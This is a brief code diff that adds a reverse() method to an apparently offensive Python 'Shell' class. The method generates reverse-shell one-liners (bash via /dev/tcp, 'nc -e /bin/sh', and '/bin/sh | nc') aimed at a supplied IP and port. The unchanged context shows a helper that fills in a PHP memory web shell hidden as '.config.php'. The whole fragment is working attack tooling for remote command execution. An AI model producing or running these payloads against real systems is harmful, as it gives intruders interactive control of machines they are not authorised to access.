@@ -50,3 +50,11 @@ class Shell(object):
 
     def memoryShell(self, shellname=".config.php", pwd="a"):
         return memoryShellPHP % (shellname, pwd)
+
+    def reverse(self, ip, port):
+        return [
+            "bash -i >& /dev/tcp/%s/%s 0>&1" % (ip, port),
+            # some version of nc not support -e
+            "nc -e /bin/sh %s %s" % (ip, port),
+            "/bin/sh | nc %s %s" % (ip, port),
+        ]
